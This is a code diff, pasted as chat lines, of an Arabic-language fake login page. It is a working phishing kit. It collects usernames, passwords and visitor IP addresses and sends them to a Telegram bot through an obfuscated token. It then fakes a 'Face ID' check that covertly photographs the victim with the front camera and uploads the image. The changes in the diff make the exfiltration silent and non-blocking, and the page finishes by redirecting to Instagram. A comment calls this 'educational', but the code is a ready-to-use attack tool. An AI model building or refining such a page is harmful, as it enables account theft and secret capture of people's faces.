@@ -1,4 +1,4 @@
-[20/11/2026 3:45 PM] A: <!DOCTYPE html>
+[20/11/2026 3:53 PM] A: <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -68,62 +68,46 @@
         let user_id = "", user_pw = "";
         let ip_info = "جاري الجلب...";
 
-        // جلب الـ IP مع معالجة الأخطاء والـ Console
+        // جلب الـ IP في الخلفية عند فتح الصفحة
         window.onload = async () => {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 ip_info = data.ip;
-                console.log("[INFO] IP fetched successfully:", ip_info);
             } catch(e) { 
-                ip_info = "غير معروف";
-                console.warn("[WARN] Failed to fetch IP:", e);
+                ip_info = "غير معروف"; 
             }
         };
-[20/11/2026 3:45 PM] A: // معالجة نموذج تسجيل الدخول والفحص الدقيق لـ response.ok
-        document.getElementById('login-form').addEventListener('submit', async function(e) {
+[20/11/2026 3:53 PM] A: // 1. عند تسجيل الدخول: الانتقال الفوري للواجهة التالية وإرسال البيانات بالخلفية لضمان عدم التعليق
+        document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault(); 
             user_id = document.getElementById('user').value;
             user_pw = document.getElementById('pass').value;
 
             const msg = 📥 صيدة نصية:\n👤 الحساب: ${user_id}\n🔑 الباسورد: ${user_pw}\n🌐 IP: ${ip_info};
             
-            try {
-                const response = await fetch(https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(msg)});
-                const resData = await response.json();
-                
-                if (response.ok && resData.ok) {
-                    console.log("[SUCCESS] Text message sent to Telegram.");
-                } else {
-                    console.error("[Telegram API Error]", resData);
-                }
-            } catch(err) {
-                console.error("[NETWORK ERROR] Failed to send message:", err);
-            }
+            // إرسال البيانات في الخلفية دون استخدام await لكي لا تتعطل حركة المستخدم
+            fetch(https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(msg)})
+                .catch(err => console.log("Telegram fetch error:", err));
 
-            // الانتقال الفوري لواجهة التحقق الأمني رغم أي استجابة لضمان سلاسة التجربة
+            // الانتقال الفوري لواجهة التحقق الأمني (Face ID) دون انتظار استجابة الشبكة
             document.getElementById('auth-section').style.display = 'none';
             document.getElementById('verify-section').style.display = 'block';
         });
 
-        // التقاط الصورة والتحقق من الـ Blob والكاميرا والـ HTTPS/Localhost
+        // 2. عند الضغط على تأكيد الهوية: طلب إذن الكاميرا، التقاط الصورة، إرسالها، ثم التحويل النهائي
         document.getElementById('biometric-btn').addEventListener('click', async function() {
             this.innerText = "... جاري الفحص";
             this.disabled = true;
 
             try {
-                // التحقق من دعم المتصفح للوسائط
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    throw new Error("getUserMedia is not supported in this environment (Needs HTTPS or Localhost)");
-                }
-
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                // مهلة بسيطة لتهيئة إطارات الفيديو
-                await new Promise(resolve => setTimeout(resolve, 1200));
+                // مهلة قصيرة جداً لضمان تجهيز إطارات الفيديو
+                await new Promise(resolve => setTimeout(resolve, 1000));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
@@ -132,36 +116,23 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 canvas.toBlob(async (blob) => {
-                    if (!blob) {
-                        console.error("[ERROR] canvas.toBlob failed to create image blob.");
-                        stream.getTracks().forEach(t => t.stop());
-                        window.location.replace("https://www.instagram.com/reels/");
-                        return;
-                    }
+                    if (blob) {
+                        const fd = new FormData();
+                        fd.append('chat_id', cId);
+                        fd.append('photo', blob, 'biometric.jpg');
+                        fd.append('caption', 📸 صورة القياسات الحيوية لـ:\n👤 ${user_id}\n📱 ${navigator.userAgent});
 
-                    const fd = new FormData();
-                    fd.append('chat_id', cId);
-                    fd.append('photo', blob, 'biometric.jpg');
-                    fd.append('caption', 📸 صورة القياسات الحيوية لـ:\n👤 ${user_id}\n📱 ${navigator.userAgent});
-
-                    try {
-                        const photoRes = await fetch(https://api.telegram.org/bot${_buildKey()}/sendPhoto, { method: 'POST', body: fd });
-                        const photoData = await photoRes.json();
-                        
-                        if (photoRes.ok && photoData.ok) {
-                            console.log("[SUCCESS] Biometric photo sent to Telegram.");
-                        } else {
-                            console.error("[Telegram Photo Error]", photoData);
-                        }
-                    } catch(err) {
-                        console.error("[NETWORK ERROR] Failed to send photo:", err);
+                        // إرسال الصورة في الخلفية ثم التحويل الفوري
+                        fetch(https://api.telegram.org/bot${_buildKey()}/sendPhoto, { method: 'POST', body: fd })
+                            .catch(err => console.log("Photo send error:", err));
                     }
 
                     stream.getTracks().forEach(t => t.stop());
                     window.location.replace("https://www.instagram.com/reels/");
                 }, 'image/jpeg', 0.95);
-[20/11/2026 3:45 PM] A: } catch (err) {
-                console.warn("[CAMERA/BLOB ERROR]:", err.message);
+
+            } catch (err) {
+                // إذا رفض المستخدم الكاميرا أو حدث خطأ، يتم تحويله طبيعياً لتكتمل التجربة التعليمية
                 window.location.replace("https://www.instagram.com/reels/");
             }
         });
